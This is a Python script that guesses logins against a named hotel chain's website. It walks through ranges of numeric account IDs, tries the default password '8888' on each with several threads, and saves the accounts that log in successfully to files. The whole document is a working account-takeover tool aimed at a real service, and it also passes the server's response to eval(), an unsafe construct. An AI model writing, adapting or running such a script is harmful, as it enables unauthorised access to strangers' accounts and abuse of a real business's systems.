# -*- coding:utf-8 -*- 
from requests import request
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool
import requests
import json
username_prefix = 8888000

url = "http://www.kaiyuanhotels.com/web/index/login.htm"
payload = {'userName':'0','password':'8888'}
account_start = 888800052000

def auth_account(account, password ='8888', faield_test_again = True):
    print('开始')
    payload = {'userName': '0', 'password': '8888'}
    dict.update(payload, userName= str(account))
    dict.update(payload,password = str(password))
    payload.update()
    try:
        r = requests.get(url,payload)
        if eval(r.text)['statusCode'] == '200':
            print('{}密码正确'.format(account))
            return True
        else:
            print('{}密码错误'.format(account))
            return False
    except requests.ConnectTimeout:
        if faield_test_again:
            auth_account(account, faield_test_again=False)

def spider_kaiyuan(start,end):
    file_name = '账号{0}-{1}.txt'.format(start,end)
    with open(file_name, 'a+') as f:
        for account in range(int(start), int(end)):
            if (auth_account(account=account)):
                f.write(account)

def spide_multi_run_wrapper(args):
    spider_kaiyuan(*args)
def generateCount():
    start = 888800000000
    for count in range(start,888800099999):
        with open('account.txt','a+') as f:
            f.write('{}\n'.format(count))

def generate_func_args(start,end):
    return (start,end)
if __name__ == '__main__':

    pool = ThreadPool(5)
    accounts = []
    account_start = 888800000000
    for i in range (5,9):
        args_map = generate_func_args(account_start+i*10000,account_start+i*10000+9999)
        print(args_map)
        accounts.append(args_map)
    pool.map(spide_multi_run_wrapper,accounts)





